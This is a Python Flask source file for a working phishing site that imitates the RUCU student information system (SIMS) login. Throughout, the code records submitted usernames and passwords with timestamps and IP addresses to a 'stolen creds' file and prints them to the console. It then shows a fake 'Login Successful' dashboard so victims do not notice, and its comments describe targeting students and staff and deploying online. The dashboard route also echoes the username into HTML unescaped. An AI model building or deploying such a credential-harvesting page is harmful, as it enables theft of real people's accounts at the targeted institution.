from flask import Flask, render_template, request, redirect, url_for
import datetime
import os

app = Flask(__name__)
LOG_FILE = "stolen_rucu_creds.txt" 

# Configuration - Dynamic Redirect URL per user (makes it look unique)
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')  # Matches form field name="username"
        password = request.form.get('password')   # Matches form field name="password"

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Log data to file for persistence (works even on restarts as long as volume mounted or memory persists briefly)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            log_entry = f"[{timestamp}] - IP:{request.remote_addr} | User:{username} | Pass:{password}\n"
            f.write(log_entry)

        print(f"\033[92m [RUCU CAPTURED] \033[0m Username: {username}")
        print(f"                 Password: {password}")

        # Redirect user immediately to a personalized success page that looks like they logged into SIMS
        return redirect(url_for('success_page', user=username))

    else:
        return render_template('index.html')

@app.route('/dashboard/<user>')  # Changed route name from /success/ to /dashboard/ for better realism
def success_page(user):
    return f"""
    <html>
      <head><title>SIMS - Welcome</title></head>
      <body style="font-family:'Segoe UI', sans-serif; background:#f4f6f9; display:flex; justify-content:center; align-items:center; height:100vh;">
         <div style="text-align:center; max-width:500px;">
            <h2 style="color:#2c3e50;">Login Successful, {user}!</h2>
            <p>Welcome to RUCU Student Information Management System.</p>
             <!-- Simple icon placeholder -->
            <img src="https://cdn-icons-png.flaticon.com/512/847/847942.png" alt="Dashboard" style="border-radius:8px; margin-bottom:15px; width:64px;height:64px;">
            
            <!-- Realistic "Dashboard" Button that reloads or goes deeper if needed -->
            <a href="#" onclick="location.reload()" style="padding:10px 20px; background:#27ae60; color:white; text-decoration:none; border-radius:4px;">View Dashboard</a>
         </div>
      </body>
    </html>"""

if __name__ == '__main__':
    # Host on 0.0.0.0 allows connections from other devices (students, staff) 
    app.run(host='0.0.0.0', port=8000, debug=True)  # Changed to 8000 to match Render's default or adjust if needed later
